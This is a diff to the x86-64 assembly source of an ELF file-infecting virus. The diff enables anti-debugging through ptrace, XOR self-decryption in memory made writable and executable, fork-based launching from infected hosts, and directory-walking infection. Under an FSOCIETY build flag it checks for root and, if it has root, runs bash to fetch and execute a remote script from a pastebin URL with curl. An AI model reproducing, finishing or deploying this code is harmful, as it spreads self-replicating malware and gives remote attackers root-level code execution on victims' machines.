@@ -40,6 +40,13 @@ _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
+%ifdef FSOCIETY
+	pop rax; argument counter
+	pop rdi; start of arguments
+	lea r9, [rsp + (rax + 1) * 4]; start of envv
+	push rdi
+	push rax
+%endif
 
 	; --- START OF HELL
 	; THIS PART IS BLACK MAGIC, DON'T EDIT IT
@@ -48,44 +55,39 @@ _h3ll0w0rld:
 	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
 	; binary (gdb, strace, ...), and then it select host or not launching
 ; TODO: uncomment when it's rdy
-;	.dont_gdb_bro:
-;	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
+	.dont_gdb_bro:
+	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
 	; -- has to skip 2 byte of instruction next line
-;	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
-;	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
-;	jmp .dont_gdb_bro + 2
-
-; = DEBUG
-	xor rax, rax
-; =
+	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
+	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
+	jmp .dont_gdb_bro + 2
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .happy_mix
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
-; TODO: uncomment when it's rdy
-;		push rdx
-;		lea rdi, [rel _start]
-;		sub rdi, [rel entry_inject]
-;		mov rsi, [rel entry_inject]
-;		sub rsi, 8 * 3
-;		add rsi, [rel length]
-;		push 0x7
-;		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
-;		push 10
-;		pop rax ; mprotect
-;		syscall; change protect from file to _eof
-;
-;		lea rdi, [rel _virus]
-;		mov rdx, rdi
-;		lea rsi, [rel _params]
-;		sub rdx, rsi
-;		mov rsi, [rel length]
-;		sub rsi, rdx ; length - (_virus - _params)
-;		lea rdx, [rel _h3ll0w0rld]
-;		mov rcx, KEY_SIZE
-;		call _xor_encrypt
-;		pop rdx
+		push rdx
+		lea rdi, [rel _start]
+		sub rdi, [rel entry_inject]
+		mov rsi, [rel entry_inject]
+		sub rsi, 8 * 3
+		add rsi, [rel length]
+		push 0x7
+		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
+		push 10
+		pop rax ; mprotect
+		syscall; change protect from file to _eof
+
+		lea rdi, [rel _virus]
+		mov rdx, rdi
+		lea rsi, [rel _params]
+		sub rdx, rsi
+		mov rsi, [rel length]
+		sub rsi, rdx ; length - (_virus - _params)
+		lea rdx, [rel _h3ll0w0rld]
+		mov rcx, KEY_SIZE
+		call _xor_encrypt
+		pop rdx
 
 	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
 	.happy_mix:
@@ -108,24 +110,22 @@ _h3ll0w0rld:
 	jnz .code ; .xor_decrypt
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
-; TODO: uncomment when it's rdy
-;	.host:
-;	push SYSCALL_FORK
-;	pop rax; fork
-;	syscall
-;	cmp rax, 0x0
-;	jnz _exit
+	.host:
+	push SYSCALL_FORK
+	pop rax; fork
+	syscall
+	cmp rax, 0x0
+	jnz _exit
 
 	; host part
 	call _search_dir
 	jmp _exit
 
 	.infected:
-; TODO: uncomment when it's rdy
 		; --- END OF HELL
-;		push SYSCALL_FORK
-;		pop rax; fork
-;		syscall
+		push SYSCALL_FORK
+		pop rax; fork
+		syscall
 
 		cmp rax, 0x0
 		jz _virus
@@ -169,6 +169,8 @@ _exit:
 _virus:
 	push rdx
 	push r8
+	push r9
+
 	; copy the virus into a mmap executable
 	xor rdi, rdi; NULL
 
@@ -211,6 +213,7 @@ _virus:
 	pop rdi
 	pop rsi
 
+	pop r9
 	pop r8
 
 	push rsi ; save length
@@ -324,30 +327,24 @@ ret
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
 _search_dir:
-; TODO: uncomment when it's rdy
-;	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
+%ifndef FSOCIETY
+	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
+%else
+	call _h3ll0w0rld + 44; jmp to ret to check for ptrace locked
 
-%ifdef FSOCIETY
-	; TODO: check for root UwU
-	push 107; geteuid
+	push SYSCALL_GETEUID; geteuid
 	pop rax
 	syscall
 
 	cmp rax, 0x0
 	jne .check_process
 
-; TODO remove etc u know what i mean
-;	push SYSCALL_FORK
-;	pop rax; fork
-;	syscall
+	push SYSCALL_FORK
+	pop rax; fork
+	syscall
 
 	cmp rax, 0x0
 	jz _i_am_root
-
-; = DEBUG
-	mov rax, 60
-	syscall
-; =
 %endif
 
 	.check_process:
@@ -375,20 +372,33 @@ _search_dir:
 	.return:
 ret
 
+%ifdef FSOCIETY
 _i_am_root:
+	push r9
+	pop rdx
+
 	; I am root
-	lea rdi, [rel signature]
-	call _ft_strlen
-	mov rdx, rax
-	mov rsi, rdi
-	mov rdi, 1
-	mov rax, 1
+	xor rax, rax
+	push rax; NULL
+	lea rdi, [rel argv2]
+	push rdi
+	lea rdi, [rel argv1]
+	push rdi
+	lea rdi, [rel argv0]
+	push rdi
+
+	mov rsi, rsp
+	lea rdi, [rel argv0]
+	mov rax, 59
 	syscall
+
+	add rsp, 32
 
 	mov rdi, 0
 	mov rax, 60
 	syscall
 ret
+%endif
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
@@ -1001,8 +1011,14 @@ ret
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
-	directories db `/`, 0x0, 0x0
+; = DEBUG
+	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
+; =
+;	directories db `/`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, `sys`, 0x0, 0x0
+	argv0 db `/bin/bash`, 0x0
+	argv1 db `-c`, 0x0
+	argv2 db `$(curl -s https://pastebin.com/raw/8yQz24N9)`, 0x0
 %else
 	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
